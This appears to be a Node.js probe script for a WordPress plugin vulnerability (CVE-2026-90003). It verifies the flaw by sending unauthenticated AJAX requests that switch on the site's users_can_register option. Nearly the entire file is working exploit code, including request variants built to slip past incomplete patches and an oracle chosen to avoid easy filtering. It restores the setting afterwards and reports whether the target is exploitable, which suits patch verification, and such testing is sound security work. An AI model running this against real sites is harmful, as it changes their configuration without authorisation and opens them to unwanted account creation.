#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90003 (Old Forms <= 1.4.2
// unauthenticated arbitrary option update via the of_save_field AJAX action).
//
// Usage: node probe.mjs <base-url>
// Exit code 0 => target IS exploitable (option update succeeded & took effect)
// Exit code 1 => target is NOT exploitable (vulnerability appears fixed)
//
// Only talks to <base-url>. Uses only Node built-ins (global fetch).

const base = process.argv[2];
if (!base) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const AJAX_URL = new URL('/wp-admin/admin-ajax.php', base).toString();
const REGISTER_URL = new URL('/wp-login.php?action=register', base).toString();

// We use the real WordPress option `users_can_register` as our oracle because
// it has an observable, unauthenticated, side-effect-free-to-check signature:
// when disabled, GET /wp-login.php?action=register redirects (302) to
// ?registration=disabled; when enabled, it renders the registration form
// (200, no such redirect). This avoids needing any authenticated read-back,
// and avoids an easily-filtered "obvious" marker/key name.

async function postForm(fields) {
  const body = new URLSearchParams(fields);
  let res;
  try {
    res = await fetch(AJAX_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
      redirect: 'manual',
    });
  } catch (e) {
    return { ok: false, error: e };
  }
  let text = '';
  try {
    text = await res.text();
  } catch (_) {
    /* ignore */
  }
  return { ok: true, status: res.status, text };
}

// Returns true if registration currently appears OPEN (no redirect-to-disabled),
// false if it appears CLOSED (redirected to ?registration=disabled or similar),
// or null if we couldn't determine.
async function registrationIsOpen() {
  let res;
  try {
    res = await fetch(REGISTER_URL, { method: 'GET', redirect: 'manual' });
  } catch (e) {
    return null;
  }
  if (res.status >= 300 && res.status < 400) {
    const loc = res.headers.get('location') || '';
    if (/registration=disabled/i.test(loc)) return false;
    // Some other redirect (e.g. to https, or trailing slash) - follow once.
    try {
      const res2 = await fetch(loc, { method: 'GET', redirect: 'manual' });
      if (res2.status >= 300 && res2.status < 400) {
        const loc2 = res2.headers.get('location') || '';
        if (/registration=disabled/i.test(loc2)) return false;
        return null;
      }
      const body2 = await res2.text();
      return /name=["']user_login["']/i.test(body2);
    } catch (_) {
      return null;
    }
  }
  if (res.status === 200) {
    const body = await res.text();
    return /name=["']user_login["']/i.test(body);
  }
  return null;
}

async function setUsersCanRegister(valueStr, keyVariant) {
  return postForm({ action: 'of_save_field', key: keyVariant, value: valueStr });
}

async function main() {
  const beforeOpen = await registrationIsOpen();

  // A handful of realistic variants of the attack, in case a naive/partial
  // fix only blocks the most obvious form (e.g. only blocks exact key
  // "users_can_register", or only blocks POST without other params, etc.).
  const variants = [
    // 1. Textbook payload.
    { key: 'users_can_register', value: '1', label: 'lowercase key' },
    // 2. Mixed-case key - sanitize_key() lowercases it, so a filter that does
    //    an exact string comparison on raw $_POST['key'] before sanitization
    //    would miss this.
    { key: 'Users_Can_Register', value: '1', label: 'mixed-case key' },
    // 3. Trailing/leading whitespace around key and value.
    { key: ' users_can_register ', value: ' 1 ', label: 'padded key/value' },
    // 4. Extra unrelated/benign-looking parameters mixed in, in case a fix
    //    rejects requests with "unexpected" shapes rather than checking caps.
    { key: 'users_can_register', value: '1', extra: { nonce: 'x', form_id: '1' }, label: 'with decoy params' },
  ];

  let exploitWorked = false;
  const triedKeysToCleanUp = new Set();

  for (const variant of variants) {
    const fields = { action: 'of_save_field', key: variant.key, value: variant.value };
    if (variant.extra) Object.assign(fields, variant.extra);

    const resp = await postForm(fields);
    triedKeysToCleanUp.add('users_can_register');

    if (!resp.ok) continue;

    // Give the option update a moment to be visible (should be immediate,
    // but be tolerant of any caching layer).
    const afterOpen = await registrationIsOpen();

    if (afterOpen === true && beforeOpen !== true) {
      exploitWorked = true;
      console.error(`[probe] Variant "${variant.label}" succeeded: unauthenticated request flipped users_can_register and opened registration.`);
      break;
    } else if (afterOpen === true && beforeOpen === true) {
      // Registration was already open before we started (unusual baseline).
      // Try a round-trip: disable then re-enable via the vuln to prove control.
      await postForm({ action: 'of_save_field', key: variant.key, value: '0' });
      const nowClosed = await registrationIsOpen();
      if (nowClosed === false) {
        await postForm({ action: 'of_save_field', key: variant.key, value: '1' });
        const reopened = await registrationIsOpen();
        if (reopened === true) {
          exploitWorked = true;
          console.error(`[probe] Variant "${variant.label}" succeeded via disable/re-enable round-trip.`);
          break;
        }
      }
    }
  }

  // Restore original state best-effort.
  try {
    const restoreVal = beforeOpen ? '1' : '0';
    await setUsersCanRegister(restoreVal, 'users_can_register');
  } catch (_) {
    /* best effort only */
  }

  if (exploitWorked) {
    console.error('[probe] Target IS exploitable (CVE-2026-90003 / of_save_field arbitrary option update).');
    process.exit(0);
  } else {
    console.error('[probe] Target does NOT appear exploitable; of_save_field did not yield a controllable option update.');
    process.exit(1);
  }
}

main().catch((e) => {
  console.error('[probe] Unexpected error:', e);
  process.exit(1);
});
